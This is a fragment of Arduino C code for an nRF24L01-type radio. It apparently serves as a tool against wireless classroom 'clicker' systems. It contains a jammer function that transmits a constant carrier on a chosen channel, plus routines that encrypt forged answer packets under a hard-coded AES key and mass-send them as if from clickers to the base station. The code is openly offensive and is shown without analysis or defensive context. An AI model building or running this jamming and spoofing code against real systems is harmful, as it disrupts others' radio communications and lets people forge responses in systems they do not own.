prog_char ConstantCarrier[33] PROGMEM = "\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF\xFF";

void jammer(){
  PRINT_STRING(ConstantCarrierMode);
  digitalWrite(CE,LOW);
  digitalSpiWrite(W_REGISTER | CONFIG, 0x0A);
  delay(2);
  digitalSpiWrite(W_REGISTER | CONFIG, 0x56);
  digitalSpiWrite(W_REGISTER | EN_AA, 0x00);
  digitalSpiWrite(W_REGISTER | SETUP_RETR, 0x00);
  digitalSpiWrite(W_REGISTER | RF_SETUP, 0x16);
  digitalSpiWrite(W_REGISTER | RF_CH, channel);
  digitalSpiWrite(W_REGISTER | SETUP_AW, 0x03);
  digitalSpiWrite(FLUSH_RX);
  digitalSpiWrite(FLUSH_TX);
  digitalSpiWrite(W_REGISTER | STATUS, 0x70);
  digitalSpiWrite(W_REGISTER | TX_ADDR, (byte *)STRING(ConstantCarrier), 5);
  digitalSpiWrite(W_TX_PAYLOAD, (byte *)STRING(ConstantCarrier), 32);
  digitalWrite(CE,HIGH);
  delayMicroseconds(15);
  digitalWrite(CE,LOW);
  while(digitalRead(IRQ) == HIGH);
  digitalSpiWrite(W_REGISTER | STATUS, 0x70);
  digitalWrite(CE,HIGH);
  digitalSpiWrite(REUSE_TX_PL);
  PRINT_STRING(TransmitCarrier);
}

void repeatSendPacket(byte * MAC, byte * answer){
  byte packet[PACKET_SIZE];
  byte data[] = {*answer,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0};
  uint8_t key[] = {0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15};

  PRINT_STRING(BeforeCipher);
  Serial.write(data,DATA_SIZE);
  Serial.println();

  aes128_enc_single(key, data);

  PRINT_STRING(AfterCipher);
  Serial.write(data,DATA_SIZE);
  Serial.println();

  digitalWrite(CE,LOW);
  digitalSpiWrite(W_REGISTER | STATUS, 0x70);    // Clear interrupts
  memcpy(packet, MAC, MAC_SIZE);
  memcpy(packet+MAC_SIZE, &data, DATA_SIZE);
  digitalSpiWrite(W_TX_PAYLOAD, packet, PACKET_SIZE);
  digitalWrite(CE,HIGH);
  delay(2);
  digitalWrite(CE,LOW);
  digitalSpiWrite(REUSE_TX_PL);
  digitalWrite(CE,HIGH);
  delay(10);
}

void massSendAsClickerStart(){
    PRINT_STRING(EnterTransmitMode);
    digitalWrite(CE,LOW);                          // Modify configuration Registers
    digitalSpiWrite(W_REGISTER | CONFIG, 0x0A);    // Power On
    delay(2);
    digitalSpiWrite(W_REGISTER | CONFIG, 0x3E);    // 2-bit CRC, Transmit mode
    digitalSpiWrite(W_REGISTER | EN_AA, 0x00);     // Disable Auto-Acknowledge on all pipes
    digitalSpiWrite(W_REGISTER | SETUP_AW, 0x01);  // Select 3-byte MAC length
    digitalSpiWrite(W_REGISTER | SETUP_RETR, 0x00);// Disable retransmit
    digitalSpiWrite(W_REGISTER | RF_CH, channel);  // Select the channel to receive on
    digitalSpiWrite(W_REGISTER | RF_SETUP, 0x06);  // Set data rate to 1Mbps at high power
    digitalSpiWrite(FLUSH_TX);                     // Flush the transmit buffer
    digitalSpiWrite(W_REGISTER | STATUS, 0x70);    // Clear interrupts
    digitalSpiWrite(W_REGISTER | TX_ADDR, clickerMasterMAC, MAC_SIZE);  // Address to send packets
}
